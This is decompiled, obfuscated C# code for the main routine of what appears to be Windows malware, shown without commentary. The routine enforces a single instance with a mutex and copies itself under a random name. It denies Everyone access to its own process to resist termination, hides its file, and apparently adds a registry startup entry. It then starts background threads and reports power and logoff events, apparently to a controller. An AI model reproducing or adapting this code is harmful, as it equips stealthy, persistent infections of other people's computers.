using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Threading;
using Microsoft.Win32;

internal class Class13
{
	public static bool bool_0 = true;

	private static string string_0 = Delegate59.smethod_0(Delegate70.smethod_17());

	[CompilerGenerated]
	private static ThreadStart threadStart_0;

	public static void Main()
	{
		//IL_0120: Unknown result type (might be due to invalid IL or missing references)
		//IL_012a: Expected O, but got Unknown
		//IL_0131: Unknown result type (might be due to invalid IL or missing references)
		//IL_013b: Expected O, but got Unknown
		bool bool_ = default(bool);
		Class2.mutex_0 = Delegate209.smethod_0(bool_0: true, Delegate70.smethod_2(), ref bool_);
		if (!bool_)
		{
			Delegate82.smethod_3(0);
		}
		if (!Delegate60.smethod_0(Class2.string_0, string_0))
		{
			try
			{
				string string_ = Delegate160.smethod_0(string_0, (string)_003CModule_003E.smethod_0(1296422336u), Delegate103.smethod_0(8), (string)_003CModule_003E.smethod_0(1296422362u));
				Delegate64.smethod_4(Class2.string_0, string_);
				if (Delegate175.smethod_1(string_))
				{
					Delegate90.smethod_0(string_);
					Delegate82.smethod_3(0);
				}
			}
			catch
			{
			}
		}
		try
		{
			IntPtr intptr_ = Delegate210.smethod_0();
			RawSecurityDescriptor rawSecurityDescriptor = Delegate211.smethod_0(intptr_);
			Delegate215.smethod_0(Delegate212.smethod_0(rawSecurityDescriptor), 0, Delegate214.smethod_0(AceFlags.None, AceQualifier.AccessDenied, 2035711, Delegate213.smethod_0(WellKnownSidType.WorldSid, null), bool_0: false, null));
			Delegate216.smethod_0(intptr_, rawSecurityDescriptor);
		}
		catch
		{
		}
		if (Delegate217.smethod_0(Class2.string_0) != FileAttributes.Hidden)
		{
			Delegate85.smethod_0(Class2.string_0, FileAttributes.Hidden);
		}
		if (Delegate68.smethod_0(Delegate167.smethod_0(), Delegate70.smethod_0()) == null)
		{
			Delegate174.smethod_0(Delegate167.smethod_0(), Delegate70.smethod_0(), Class2.string_0);
		}
		Thread object_ = Delegate113.smethod_0(Class11.smethod_13);
		Delegate114.smethod_0(object_, bool_0: true);
		Delegate115.smethod_0(object_);
		Delegate218.smethod_0(new PowerModeChangedEventHandler(smethod_0));
		Delegate219.smethod_0(new SessionEndingEventHandler(smethod_1));
		Thread object_2 = Delegate113.smethod_0(delegate
		{
			Delegate223.smethod_0(Delegate221.smethod_0(), Delegate70.smethod_4(), Delegate70.smethod_15(), Delegate222.smethod_0(), Delegate70.smethod_16());
		});
		Delegate115.smethod_0(object_2);
	}

	private static void smethod_0(object sender, PowerModeChangedEventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_0009: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected I4, but got Unknown
		try
		{
			PowerModes val = Delegate220.smethod_0(e);
			switch (val - 1)
			{
			case 0:
				Delegate223.smethod_0(Delegate221.smethod_0(), Delegate70.smethod_4(), Delegate70.smethod_15(), Delegate222.smethod_0(), Delegate70.smethod_16());
				break;
			case 2:
				Delegate86.smethod_1((string)_003CModule_003E.smethod_0(2644313053u));
				break;
			case 1:
				break;
			}
		}
		catch
		{
		}
	}

	private static void smethod_1(object sender, SessionEndingEventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_0009: Unknown result type (might be due to invalid IL or missing references)
		//IL_0017: Expected I4, but got Unknown
		try
		{
			SessionEndReasons val = Delegate224.smethod_0(e);
			switch (val - 1)
			{
			case 0:
				Delegate86.smethod_1((string)_003CModule_003E.smethod_0(3219117378u));
				break;
			case 1:
				Delegate86.smethod_1((string)_003CModule_003E.smethod_0(3219117476u));
				break;
			}
		}
		catch
		{
		}
	}

	[CompilerGenerated]
	private static void smethod_2()
	{
		Delegate223.smethod_0(Delegate221.smethod_0(), Delegate70.smethod_4(), Delegate70.smethod_15(), Delegate222.smethod_0(), Delegate70.smethod_16());
	}
}
